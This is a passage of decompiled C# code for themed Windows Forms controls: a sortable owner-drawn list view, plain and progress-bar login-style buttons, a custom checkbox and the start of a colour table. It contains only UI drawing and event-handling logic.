							if (flag)
							{
								bool flag2 = num3 != num;
								if (flag2)
								{
									L1V.__ENCList[num] = L1V.__ENCList[num3];
								}
								num++;
							}
							num3++;
						}
						L1V.__ENCList.RemoveRange(num, L1V.__ENCList.Count - num);
						L1V.__ENCList.Capacity = L1V.__ENCList.Count;
					}
					L1V.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		public L1V()
		{
			L1V.__ENCAddToList(this);
			base.ColumnClick += new ColumnClickEventHandler(this.cc);
			this.AllowDrop = false;
			this.Font = new Font("arial", 8f, FontStyle.Bold);
			this.Dock = DockStyle.Fill;
			this.FullRowSelect = true;
			this.View = View.Details;
			this.OwnerDraw = true;
			this.GridLines = false;
			this.SetStyle(ControlStyles.AllPaintingInWmPaint | ControlStyles.OptimizedDoubleBuffer, true);
			this.SetStyle(ControlStyles.EnableNotifyMessage, true);
		}

		public void cc(object sender, ColumnClickEventArgs e)
		{
			lock (this)
			{
				try
				{
					object[] arguments = new object[]
					{
						e.Column
					};
					ColumnHeader columnHeader = (ColumnHeader)NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(sender))), null, "Columns", arguments, null, null, null);
					bool flag = this.m_SortingColumn != null;
					bool flag2;
					SortOrder sortOrder;
					if (flag)
					{
						flag2 = !columnHeader.Equals(this.m_SortingColumn);
						if (flag2)
						{
							sortOrder = SortOrder.Ascending;
						}
						else
						{
							sortOrder = ((!this.m_SortingColumn.Text.StartsWith("+")) ? SortOrder.Ascending : SortOrder.Descending);
						}
						this.m_SortingColumn.Text = this.m_SortingColumn.Text.Substring(1);
					}
					else
					{
						sortOrder = SortOrder.Ascending;
					}
					this.m_SortingColumn = columnHeader;
					flag2 = (sortOrder != SortOrder.Ascending);
					if (flag2)
					{
						this.m_SortingColumn.Text = "-" + this.m_SortingColumn.Text;
					}
					else
					{
						this.m_SortingColumn.Text = "+" + this.m_SortingColumn.Text;
					}
					flag2 = (sender != null);
					if (flag2)
					{
						arguments = new object[]
						{
							new L1V.clsListviewSorter(e.Column, sortOrder)
						};
						NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(sender))), null, "ListViewItemSorter", arguments, null, null);
						NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(sender))), null, "Sort", new object[1], null, null, null, true);
						arguments = new object[]
						{
							null
						};
						NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(sender))), null, "ListViewItemSorter", arguments, null, null);
					}
				}
				catch (Exception expr_1B5)
				{
					ProjectData.SetProjectError(expr_1B5);
					ProjectData.ClearProjectError();
				}
			}
		}

		public void FX()
		{
			bool flag = this.Items.Count != 0;
			if (flag)
			{
				this.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
			}
			else
			{
				this.Columns[checked(this.Columns.Count - 1)].AutoResize(ColumnHeaderAutoResizeStyle.HeaderSize);
			}
		}

		protected override void OnColumnWidthChanged(ColumnWidthChangedEventArgs e)
		{
			base.OnColumnWidthChanged(e);
		}

		protected override void OnDrawColumnHeader(DrawListViewColumnHeaderEventArgs e)
		{
			IEnumerator enumerator = null;
			int num = 0;
			Graphics graphics = e.Graphics;
			checked
			{
				int alpha = (int)Math.Round(Math.Round(Math.Round((double)(unchecked((float)this.BackColor.A * 0.1f)))));
				int red = (int)Math.Round(Math.Round(Math.Round((double)(unchecked((float)this.BackColor.R * 0.1f)))));
				int green = (int)Math.Round(Math.Round(Math.Round((double)(unchecked((float)this.BackColor.G * 0.1f)))));
				Brush brush = new Pen(Color.FromArgb(alpha, red, green, (int)Math.Round(Math.Round(Math.Round((double)(unchecked((float)this.BackColor.B * 0.1f))))))).Brush;
				int width = e.Header.ListView.Width;
				graphics.FillRectangle(brush, 0, 0, width, (int)Math.Round(Math.Round(Math.Round((double)e.Bounds.Height / 2.0))));
				Graphics graphics2 = e.Graphics;
				int alpha2 = (int)Math.Round(Math.Round(Math.Round((double)(unchecked((float)this.BackColor.A * 0.5f)))));
				int red2 = (int)Math.Round(Math.Round(Math.Round((double)(unchecked((float)this.BackColor.R * 0.5f)))));
				int green2 = (int)Math.Round(Math.Round(Math.Round((double)(unchecked((float)this.BackColor.G * 0.5f)))));
				Brush brush2 = new Pen(Color.FromArgb(alpha2, red2, green2, (int)Math.Round(Math.Round(Math.Round((double)(unchecked((float)this.BackColor.B * 0.5f))))))).Brush;
				int y = (int)Math.Round(Math.Round(Math.Round((double)e.Bounds.Height / 2.0)));
				int width2 = e.Header.ListView.Width;
				graphics2.FillRectangle(brush2, 0, y, width2, (int)Math.Round(Math.Round(Math.Round((double)e.Bounds.Height / 2.0))));
				try
				{
					enumerator = this.Columns.GetEnumerator();
					while (enumerator.MoveNext())
					{
						ColumnHeader columnHeader = (ColumnHeader)enumerator.Current;
						int y2 = e.Bounds.Y;
						int width3 = columnHeader.Width;
						Rectangle r = new Rectangle(num, y2, width3, e.Bounds.Height);
						StringFormat format = new StringFormat
						{
							FormatFlags = StringFormatFlags.LineLimit,
							Trimming = StringTrimming.Character,
							Alignment = StringAlignment.Center
						};
						e.Graphics.DrawString(columnHeader.Text, this.Font, new Pen(this.ForeColor).Brush, r, format);
						Graphics graphics3 = e.Graphics;
						Pen pen = new Pen(this.ForeColor);
						int x = num + columnHeader.Width;
						int y3 = e.Bounds.Y;
						int x2 = num + columnHeader.Width;
						int y4 = e.Bounds.Y;
						graphics3.DrawLine(pen, x, y3, x2, y4 + e.Bounds.Height);
						num += columnHeader.Width;
					}
				}
				finally
				{
					bool flag = enumerator is IDisposable;
					if (flag)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
				e.DrawDefault = false;
				base.OnDrawColumnHeader(e);
			}
		}

		protected override void OnDrawItem(DrawListViewItemEventArgs e)
		{
			e.DrawDefault = true;
			base.OnDrawItem(e);
		}

		protected override void OnDrawSubItem(DrawListViewSubItemEventArgs e)
		{
			e.DrawDefault = true;
			base.OnDrawSubItem(e);
		}

		protected override void OnNotifyMessage(Message m)
		{
			bool flag = m.Msg != 20;
			if (flag)
			{
				base.OnNotifyMessage(m);
			}
		}
	}
}

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Text;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace nj
{
	public class LogInButton : Control
	{
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		private readonly Font _Font;

		private Color _ProgressColour;

		private Color _BorderColour;

		private Color _FontColour;

		private Color _MainColour;

		private Color _HoverColour;

		private Color _PressedColour;

		private MouseState State;

		[Category("Colours")]
		public Color ProgressColour
		{
			get
			{
				return this._ProgressColour;
			}
			set
			{
				this._ProgressColour = value;
			}
		}

		[Category("Colours")]
		public Color BorderColour
		{
			get
			{
				return this._BorderColour;
			}
			set
			{
				this._BorderColour = value;
			}
		}

		[Category("Colours")]
		public Color FontColour
		{
			get
			{
				return this._FontColour;
			}
			set
			{
				this._FontColour = value;
			}
		}

		[Category("Colours")]
		public Color BaseColour
		{
			get
			{
				return this._MainColour;
			}
			set
			{
				this._MainColour = value;
			}
		}

		[Category("Colours")]
		public Color HoverColour
		{
			get
			{
				return this._HoverColour;
			}
			set
			{
				this._HoverColour = value;
			}
		}

		[Category("Colours")]
		public Color PressedColour
		{
			get
			{
				return this._PressedColour;
			}
			set
			{
				this._PressedColour = value;
			}
		}

		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = LogInButton.__ENCList;
			checked
			{
				lock (_ENCList)
				{
					bool flag = LogInButton.__ENCList.Count == LogInButton.__ENCList.Capacity;
					if (flag)
					{
						int num = 0;
						int arg_3F_0 = 0;
						int num2 = LogInButton.__ENCList.Count - 1;
						int num3 = arg_3F_0;
						while (true)
						{
							int arg_90_0 = num3;
							int num4 = num2;
							if (arg_90_0 > num4)
							{
								break;
							}
							WeakReference weakReference = LogInButton.__ENCList[num3];
							flag = weakReference.IsAlive;
							if (flag)
							{
								bool flag2 = num3 != num;
								if (flag2)
								{
									LogInButton.__ENCList[num] = LogInButton.__ENCList[num3];
								}
								num++;
							}
							num3++;
						}
						LogInButton.__ENCList.RemoveRange(num, LogInButton.__ENCList.Count - num);
						LogInButton.__ENCList.Capacity = LogInButton.__ENCList.Count;
					}
					LogInButton.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		protected override void OnMouseDown(MouseEventArgs e)
		{
			base.OnMouseDown(e);
			this.State = MouseState.Down;
			this.Invalidate();
		}

		protected override void OnMouseUp(MouseEventArgs e)
		{
			base.OnMouseUp(e);
			this.State = MouseState.Over;
			this.Invalidate();
		}

		protected override void OnMouseEnter(EventArgs e)
		{
			base.OnMouseEnter(e);
			this.State = MouseState.Over;
			this.Invalidate();
		}

		protected override void OnMouseLeave(EventArgs e)
		{
			base.OnMouseLeave(e);
			this.State = MouseState.None;
			this.Invalidate();
		}

		public LogInButton()
		{
			LogInButton.__ENCAddToList(this);
			this._Font = new Font("Segoe UI", 9f);
			this._ProgressColour = Color.FromArgb(0, 191, 255);
			this._BorderColour = Color.FromArgb(25, 25, 25);
			this._FontColour = Color.FromArgb(255, 255, 255);
			this._MainColour = Color.FromArgb(42, 42, 42);
			this._HoverColour = Color.FromArgb(52, 52, 52);
			this._PressedColour = Color.FromArgb(47, 47, 47);
			this.State = MouseState.None;
			this.SetStyle(ControlStyles.UserPaint | ControlStyles.ResizeRedraw | ControlStyles.SupportsTransparentBackColor | ControlStyles.AllPaintingInWmPaint | ControlStyles.OptimizedDoubleBuffer, true);
			this.DoubleBuffered = true;
			Size size = new Size(75, 30);
			this.Size = size;
			this.BackColor = Color.Transparent;
		}

		protected override void OnPaint(PaintEventArgs e)
		{
			Graphics graphics = e.Graphics;
			Graphics graphics2 = graphics;
			graphics2.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
			graphics2.SmoothingMode = SmoothingMode.HighQuality;
			graphics2.PixelOffsetMode = PixelOffsetMode.HighQuality;
			graphics2.InterpolationMode = InterpolationMode.HighQualityBicubic;
			graphics2.Clear(this.BackColor);
			checked
			{
				switch (this.State)
				{
				case MouseState.None:
				{
					Graphics arg_7C_0 = graphics2;
					Brush arg_7C_1 = new SolidBrush(this._MainColour);
					Rectangle rect = new Rectangle(0, 0, this.Width, this.Height);
					arg_7C_0.FillRectangle(arg_7C_1, rect);
					Graphics arg_AA_0 = graphics2;
					Pen arg_AA_1 = new Pen(this._BorderColour, 2f);
					rect = new Rectangle(0, 0, this.Width, this.Height);
					arg_AA_0.DrawRectangle(arg_AA_1, rect);
					Graphics arg_11A_0 = graphics2;
					string arg_11A_1 = this.Text;
					Font arg_11A_2 = this._Font;
					Brush arg_11A_3 = Brushes.White;
					Point p = new Point((int)Math.Round((double)this.Width / 2.0), (int)Math.Round((double)this.Height / 2.0));
					arg_11A_0.DrawString(arg_11A_1, arg_11A_2, arg_11A_3, p, new StringFormat
					{
						Alignment = StringAlignment.Center,
						LineAlignment = StringAlignment.Center
					});
					break;
				}
				case MouseState.Over:
				{
					Graphics arg_149_0 = graphics2;
					Brush arg_149_1 = new SolidBrush(this._HoverColour);
					Rectangle rect = new Rectangle(0, 0, this.Width, this.Height);
					arg_149_0.FillRectangle(arg_149_1, rect);
					Graphics arg_17B_0 = graphics2;
					Pen arg_17B_1 = new Pen(this._BorderColour, 1f);
					rect = new Rectangle(1, 1, this.Width - 2, this.Height - 2);
					arg_17B_0.DrawRectangle(arg_17B_1, rect);
					Graphics arg_1EB_0 = graphics2;
					string arg_1EB_1 = this.Text;
					Font arg_1EB_2 = this._Font;
					Brush arg_1EB_3 = Brushes.White;
					Point p = new Point((int)Math.Round((double)this.Width / 2.0), (int)Math.Round((double)this.Height / 2.0));
					arg_1EB_0.DrawString(arg_1EB_1, arg_1EB_2, arg_1EB_3, p, new StringFormat
					{
						Alignment = StringAlignment.Center,
						LineAlignment = StringAlignment.Center
					});
					break;
				}
				case MouseState.Down:
				{
					Graphics arg_21A_0 = graphics2;
					Brush arg_21A_1 = new SolidBrush(this._PressedColour);
					Rectangle rect = new Rectangle(0, 0, this.Width, this.Height);
					arg_21A_0.FillRectangle(arg_21A_1, rect);
					Graphics arg_24C_0 = graphics2;
					Pen arg_24C_1 = new Pen(this._BorderColour, 1f);
					rect = new Rectangle(1, 1, this.Width - 2, this.Height - 2);
					arg_24C_0.DrawRectangle(arg_24C_1, rect);
					Graphics arg_2BC_0 = graphics2;
					string arg_2BC_1 = this.Text;
					Font arg_2BC_2 = this._Font;
					Brush arg_2BC_3 = Brushes.White;
					Point p = new Point((int)Math.Round((double)this.Width / 2.0), (int)Math.Round((double)this.Height / 2.0));
					arg_2BC_0.DrawString(arg_2BC_1, arg_2BC_2, arg_2BC_3, p, new StringFormat
					{
						Alignment = StringAlignment.Center,
						LineAlignment = StringAlignment.Center
					});
					break;
				}
				}
			}
		}
	}
}

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Text;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace nj
{
	public class LogInButtonWithProgress : Control
	{
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		private int _Value;

		private int _Maximum;

		private Font _Font;

		private Color _ProgressColour;

		private Color _BorderColour;

		private Color _FontColour;

		private Color _MainColour;

		private Color _HoverColour;

		private Color _PressedColour;

		private MouseState State;

		[Category("Colours")]
		public Color ProgressColour
		{
			get
			{
				return this._ProgressColour;
			}
			set
			{
				this._ProgressColour = value;
			}
		}

		[Category("Colours")]
		public Color BorderColour
		{
			get
			{
				return this._BorderColour;
			}
			set
			{
				this._BorderColour = value;
			}
		}

		[Category("Colours")]
		public Color FontColour
		{
			get
			{
				return this._FontColour;
			}
			set
			{
				this._FontColour = value;
			}
		}

		[Category("Colours")]
		public Color BaseColour
		{
			get
			{
				return this._MainColour;
			}
			set
			{
				this._MainColour = value;
			}
		}

		[Category("Colours")]
		public Color HoverColour
		{
			get
			{
				return this._HoverColour;
			}
			set
			{
				this._HoverColour = value;
			}
		}

		[Category("Colours")]
		public Color PressedColour
		{
			get
			{
				return this._PressedColour;
			}
			set
			{
				this._PressedColour = value;
			}
		}

		[Category("Control")]
		public int Maximum
		{
			get
			{
				return this._Maximum;
			}
			set
			{
				bool flag = value < this._Value;
				if (flag)
				{
					this._Value = value;
				}
				this._Maximum = value;
				this.Invalidate();
			}
		}

		[Category("Control")]
		public int Value
		{
			get
			{
				int value = this._Value;
				bool flag = value == 0;
				int result;
				if (flag)
				{
					result = 0;
				}
				else
				{
					result = this._Value;
				}
				return result;
			}
			set
			{
				int num = value;
				bool flag = num > this._Maximum;
				if (flag)
				{
					value = this._Maximum;
					this.Invalidate();
				}
				this._Value = value;
				this.Invalidate();
			}
		}

		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = LogInButtonWithProgress.__ENCList;
			checked
			{
				lock (_ENCList)
				{
					bool flag = LogInButtonWithProgress.__ENCList.Count == LogInButtonWithProgress.__ENCList.Capacity;
					if (flag)
					{
						int num = 0;
						int arg_3F_0 = 0;
						int num2 = LogInButtonWithProgress.__ENCList.Count - 1;
						int num3 = arg_3F_0;
						while (true)
						{
							int arg_90_0 = num3;
							int num4 = num2;
							if (arg_90_0 > num4)
							{
								break;
							}
							WeakReference weakReference = LogInButtonWithProgress.__ENCList[num3];
							flag = weakReference.IsAlive;
							if (flag)
							{
								bool flag2 = num3 != num;
								if (flag2)
								{
									LogInButtonWithProgress.__ENCList[num] = LogInButtonWithProgress.__ENCList[num3];
								}
								num++;
							}
							num3++;
						}
						LogInButtonWithProgress.__ENCList.RemoveRange(num, LogInButtonWithProgress.__ENCList.Count - num);
						LogInButtonWithProgress.__ENCList.Capacity = LogInButtonWithProgress.__ENCList.Count;
					}
					LogInButtonWithProgress.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		protected override void OnMouseDown(MouseEventArgs e)
		{
			base.OnMouseDown(e);
			this.State = MouseState.Down;
			this.Invalidate();
		}

		protected override void OnMouseUp(MouseEventArgs e)
		{
			base.OnMouseUp(e);
			this.State = MouseState.Over;
			this.Invalidate();
		}

		protected override void OnMouseEnter(EventArgs e)
		{
			base.OnMouseEnter(e);
			this.State = MouseState.Over;
			this.Invalidate();
		}

		protected override void OnMouseLeave(EventArgs e)
		{
			base.OnMouseLeave(e);
			this.State = MouseState.None;
			this.Invalidate();
		}

		public void Increment(int Amount)
		{
			checked
			{
				this.Value += Amount;
			}
		}

		public LogInButtonWithProgress()
		{
			LogInButtonWithProgress.__ENCAddToList(this);
			this._Value = 0;
			this._Maximum = 100;
			this._Font = new Font("Segoe UI", 9f);
			this._ProgressColour = Color.FromArgb(0, 191, 255);
			this._BorderColour = Color.FromArgb(25, 25, 25);
			this._FontColour = Color.FromArgb(255, 255, 255);
			this._MainColour = Color.FromArgb(42, 42, 42);
			this._HoverColour = Color.FromArgb(52, 52, 52);
			this._PressedColour = Color.FromArgb(47, 47, 47);
			this.State = MouseState.None;
			this.SetStyle(ControlStyles.UserPaint | ControlStyles.ResizeRedraw | ControlStyles.SupportsTransparentBackColor | ControlStyles.AllPaintingInWmPaint | ControlStyles.OptimizedDoubleBuffer, true);
			this.DoubleBuffered = true;
			Size size = new Size(75, 30);
			this.Size = size;
			this.BackColor = Color.Transparent;
		}

		protected override void OnPaint(PaintEventArgs e)
		{
			Graphics graphics = e.Graphics;
			Graphics graphics2 = graphics;
			graphics2.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
			graphics2.SmoothingMode = SmoothingMode.HighQuality;
			graphics2.PixelOffsetMode = PixelOffsetMode.HighQuality;
			graphics2.Clear(this.BackColor);
			checked
			{
				switch (this.State)
				{
				case MouseState.None:
				{
					Graphics arg_76_0 = graphics2;
					Brush arg_76_1 = new SolidBrush(this._MainColour);
					Rectangle rect = new Rectangle(0, 0, this.Width, this.Height - 4);
					arg_76_0.FillRectangle(arg_76_1, rect);
					Graphics arg_A6_0 = graphics2;
					Pen arg_A6_1 = new Pen(this._BorderColour, 2f);
					rect = new Rectangle(0, 0, this.Width, this.Height - 4);
					arg_A6_0.DrawRectangle(arg_A6_1, rect);
					Graphics arg_120_0 = graphics2;
					string arg_120_1 = this.Text;
					Font arg_120_2 = this._Font;
					Brush arg_120_3 = Brushes.White;
					Point p = new Point((int)Math.Round((double)this.Width / 2.0), (int)Math.Round(unchecked((double)this.Height / 2.0 - 2.0)));
					arg_120_0.DrawString(arg_120_1, arg_120_2, arg_120_3, p, new StringFormat
					{
						Alignment = StringAlignment.Center,
						LineAlignment = StringAlignment.Center
					});
					break;
				}
				case MouseState.Over:
				{
					Graphics arg_151_0 = graphics2;
					Brush arg_151_1 = new SolidBrush(this._HoverColour);
					Rectangle rect = new Rectangle(0, 0, this.Width, this.Height - 4);
					arg_151_0.FillRectangle(arg_151_1, rect);
					Graphics arg_183_0 = graphics2;
					Pen arg_183_1 = new Pen(this._BorderColour, 1f);
					rect = new Rectangle(1, 1, this.Width - 2, this.Height - 5);
					arg_183_0.DrawRectangle(arg_183_1, rect);
					Graphics arg_1FD_0 = graphics2;
					string arg_1FD_1 = this.Text;
					Font arg_1FD_2 = this._Font;
					Brush arg_1FD_3 = Brushes.White;
					Point p = new Point((int)Math.Round((double)this.Width / 2.0), (int)Math.Round(unchecked((double)this.Height / 2.0 - 2.0)));
					arg_1FD_0.DrawString(arg_1FD_1, arg_1FD_2, arg_1FD_3, p, new StringFormat
					{
						Alignment = StringAlignment.Center,
						LineAlignment = StringAlignment.Center
					});
					break;
				}
				case MouseState.Down:
				{
					Graphics arg_22E_0 = graphics2;
					Brush arg_22E_1 = new SolidBrush(this._PressedColour);
					Rectangle rect = new Rectangle(0, 0, this.Width, this.Height - 4);
					arg_22E_0.FillRectangle(arg_22E_1, rect);
					Graphics arg_260_0 = graphics2;
					Pen arg_260_1 = new Pen(this._BorderColour, 1f);
					rect = new Rectangle(1, 1, this.Width - 2, this.Height - 5);
					arg_260_0.DrawRectangle(arg_260_1, rect);
					Graphics arg_2DA_0 = graphics2;
					string arg_2DA_1 = this.Text;
					Font arg_2DA_2 = this._Font;
					Brush arg_2DA_3 = Brushes.White;
					Point p = new Point((int)Math.Round((double)this.Width / 2.0), (int)Math.Round(unchecked((double)this.Height / 2.0 - 2.0)));
					arg_2DA_0.DrawString(arg_2DA_1, arg_2DA_2, arg_2DA_3, p, new StringFormat
					{
						Alignment = StringAlignment.Center,
						LineAlignment = StringAlignment.Center
					});
					break;
				}
				}
				int value = this._Value;
				bool flag = value == 0;
				if (!flag)
				{
					flag = (value == this._Maximum);
					if (flag)
					{
						Graphics arg_338_0 = graphics2;
						Brush arg_338_1 = new SolidBrush(this._ProgressColour);
						Rectangle rect = new Rectangle(0, this.Height - 4, this.Width, this.Height - 4);
						arg_338_0.FillRectangle(arg_338_1, rect);
						Graphics arg_366_0 = graphics2;
						Pen arg_366_1 = new Pen(this._BorderColour, 2f);
						rect = new Rectangle(0, 0, this.Width, this.Height);
						arg_366_0.DrawRectangle(arg_366_1, rect);
					}
					else
					{
						Graphics arg_3B2_0 = graphics2;
						Brush arg_3B2_1 = new SolidBrush(this._ProgressColour);
						Rectangle rect = new Rectangle(0, this.Height - 4, (int)Math.Round(unchecked((double)this.Width / (double)this._Maximum * (double)this._Value)), this.Height - 4);
						arg_3B2_0.FillRectangle(arg_3B2_1, rect);
						Graphics arg_3E0_0 = graphics2;
						Pen arg_3E0_1 = new Pen(this._BorderColour, 2f);
						rect = new Rectangle(0, 0, this.Width, this.Height);
						arg_3E0_0.DrawRectangle(arg_3E0_1, rect);
					}
				}
				graphics2.InterpolationMode = InterpolationMode.HighQualityBicubic;
			}
		}
	}
}

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Text;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace nj
{
	[DefaultEvent("CheckedChanged")]
	public class LogInCheckBox : Control
	{
		public delegate void CheckedChangedEventHandler(object sender);

		private static List<WeakReference> __ENCList = new List<WeakReference>();

		private bool _Checked;

		private MouseState State;

		private Color _CheckedColour;

		private Color _BorderColour;

		private Color _BackColour;

		private Color _TextColour;

		private LogInCheckBox.CheckedChangedEventHandler CheckedChangedEvent;

		public event LogInCheckBox.CheckedChangedEventHandler CheckedChanged
		{
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			add
			{
				this.CheckedChangedEvent = (LogInCheckBox.CheckedChangedEventHandler)Delegate.Combine(this.CheckedChangedEvent, value);
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			remove
			{
				this.CheckedChangedEvent = (LogInCheckBox.CheckedChangedEventHandler)Delegate.Remove(this.CheckedChangedEvent, value);
			}
		}

		[Category("Colours")]
		public Color BaseColour
		{
			get
			{
				return this._BackColour;
			}
			set
			{
				this._BackColour = value;
			}
		}

		[Category("Colours")]
		public Color BorderColour
		{
			get
			{
				return this._BorderColour;
			}
			set
			{
				this._BorderColour = value;
			}
		}

		[Category("Colours")]
		public Color CheckedColour
		{
			get
			{
				return this._CheckedColour;
			}
			set
			{
				this._CheckedColour = value;
			}
		}

		[Category("Colours")]
		public Color FontColour
		{
			get
			{
				return this._TextColour;
			}
			set
			{
				this._TextColour = value;
			}
		}

		public bool Checked
		{
			get
			{
				return this._Checked;
			}
			set
			{
				this._Checked = value;
				this.Invalidate();
			}
		}

		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = LogInCheckBox.__ENCList;
			checked
			{
				lock (_ENCList)
				{
					bool flag = LogInCheckBox.__ENCList.Count == LogInCheckBox.__ENCList.Capacity;
					if (flag)
					{
						int num = 0;
						int arg_3F_0 = 0;
						int num2 = LogInCheckBox.__ENCList.Count - 1;
						int num3 = arg_3F_0;
						while (true)
						{
							int arg_90_0 = num3;
							int num4 = num2;
							if (arg_90_0 > num4)
							{
								break;
							}
							WeakReference weakReference = LogInCheckBox.__ENCList[num3];
							flag = weakReference.IsAlive;
							if (flag)
							{
								bool flag2 = num3 != num;
								if (flag2)
								{
									LogInCheckBox.__ENCList[num] = LogInCheckBox.__ENCList[num3];
								}
								num++;
							}
							num3++;
						}
						LogInCheckBox.__ENCList.RemoveRange(num, LogInCheckBox.__ENCList.Count - num);
						LogInCheckBox.__ENCList.Capacity = LogInCheckBox.__ENCList.Count;
					}
					LogInCheckBox.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		protected override void OnTextChanged(EventArgs e)
		{
			base.OnTextChanged(e);
			this.Invalidate();
		}

		protected override void OnClick(EventArgs e)
		{
			this._Checked = !this._Checked;
			LogInCheckBox.CheckedChangedEventHandler checkedChangedEvent = this.CheckedChangedEvent;
			bool flag = checkedChangedEvent != null;
			if (flag)
			{
				checkedChangedEvent(this);
			}
			base.OnClick(e);
		}

		protected override void OnResize(EventArgs e)
		{
			base.OnResize(e);
			this.Height = 22;
		}

		protected override void OnMouseDown(MouseEventArgs e)
		{
			base.OnMouseDown(e);
			this.State = MouseState.Down;
			this.Invalidate();
		}

		protected override void OnMouseUp(MouseEventArgs e)
		{
			base.OnMouseUp(e);
			this.State = MouseState.Over;
			this.Invalidate();
		}

		protected override void OnMouseEnter(EventArgs e)
		{
			base.OnMouseEnter(e);
			this.State = MouseState.Over;
			this.Invalidate();
		}

		protected override void OnMouseLeave(EventArgs e)
		{
			base.OnMouseLeave(e);
			this.State = MouseState.None;
			this.Invalidate();
		}

		public LogInCheckBox()
		{
			LogInCheckBox.__ENCAddToList(this);
			this.State = MouseState.None;
			this._CheckedColour = Color.FromArgb(173, 173, 174);
			this._BorderColour = Color.FromArgb(35, 35, 35);
			this._BackColour = Color.FromArgb(42, 42, 42);
			this._TextColour = Color.FromArgb(255, 255, 255);
			this.SetStyle(ControlStyles.UserPaint | ControlStyles.ResizeRedraw | ControlStyles.SupportsTransparentBackColor | ControlStyles.AllPaintingInWmPaint | ControlStyles.OptimizedDoubleBuffer, true);
			this.DoubleBuffered = true;
			this.Cursor = Cursors.Hand;
			Size size = new Size(100, 22);
			this.Size = size;
		}

		protected override void OnPaint(PaintEventArgs e)
		{
			Graphics graphics = e.Graphics;
			Rectangle rect = new Rectangle(0, 0, 20, 20);
			Graphics graphics2 = graphics;
			graphics2.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
			graphics2.SmoothingMode = SmoothingMode.HighQuality;
			graphics2.PixelOffsetMode = PixelOffsetMode.HighQuality;
			graphics2.Clear(Color.FromArgb(54, 54, 54));
			graphics2.FillRectangle(new SolidBrush(this._BackColour), rect);
			Graphics arg_71_0 = graphics2;
			Pen arg_71_1 = new Pen(this._BorderColour);
			Rectangle rectangle = new Rectangle(1, 1, 18, 18);
			arg_71_0.DrawRectangle(arg_71_1, rectangle);
			MouseState state = this.State;
			bool flag = state == MouseState.Over;
			if (flag)
			{
				graphics2.FillRectangle(new SolidBrush(Color.FromArgb(50, 49, 51)), rect);
				Graphics arg_C0_0 = graphics2;
				Pen arg_C0_1 = new Pen(this._BorderColour);
				rectangle = new Rectangle(1, 1, 18, 18);
				arg_C0_0.DrawRectangle(arg_C0_1, rectangle);
			}
			flag = this.Checked;
			if (flag)
			{
				Point[] array = new Point[6];
				Point[] arg_F3_0_cp_0 = array;
				int arg_F3_0_cp_1 = 0;
				Point point = new Point(4, 11);
				arg_F3_0_cp_0[arg_F3_0_cp_1] = point;
				Point[] arg_10C_0_cp_0 = array;
				int arg_10C_0_cp_1 = 1;
				Point point2 = new Point(6, 8);
				arg_10C_0_cp_0[arg_10C_0_cp_1] = point2;
				Point[] arg_127_0_cp_0 = array;
				int arg_127_0_cp_1 = 2;
				Point point3 = new Point(9, 12);
				arg_127_0_cp_0[arg_127_0_cp_1] = point3;
				Point[] arg_141_0_cp_0 = array;
				int arg_141_0_cp_1 = 3;
				Point point4 = new Point(15, 3);
				arg_141_0_cp_0[arg_141_0_cp_1] = point4;
				Point[] arg_15B_0_cp_0 = array;
				int arg_15B_0_cp_1 = 4;
				Point point5 = new Point(17, 6);
				arg_15B_0_cp_0[arg_15B_0_cp_1] = point5;
				Point[] arg_176_0_cp_0 = array;
				int arg_176_0_cp_1 = 5;
				Point point6 = new Point(9, 16);
				arg_176_0_cp_0[arg_176_0_cp_1] = point6;
				Point[] points = array;
				graphics2.FillPolygon(new SolidBrush(this._CheckedColour), points);
			}
			Graphics arg_1E5_0 = graphics2;
			string arg_1E5_1 = this.Text;
			Font arg_1E5_2 = this.Font;
			Brush arg_1E5_3 = new SolidBrush(this._TextColour);
			rectangle = new Rectangle(24, 1, this.Width, checked(this.Height - 2));
			arg_1E5_0.DrawString(arg_1E5_1, arg_1E5_2, arg_1E5_3, rectangle, new StringFormat
			{
				Alignment = StringAlignment.Near,
				LineAlignment = StringAlignment.Center
			});
			graphics2.InterpolationMode = InterpolationMode.HighQualityBicubic;
		}
	}
}

using System;
using System.ComponentModel;
using System.Drawing;
using System.Windows.Forms;

namespace nj
{
	public class LogInColourTable : ProfessionalColorTable
	{
		private Color _BackColour;

		private Color _BorderColour;

		private Color _SelectedColour;

		[Category("Colours")]
		public Color SelectedColour
		{
			get
			{
				return this._SelectedColour;
			}
			set
			{
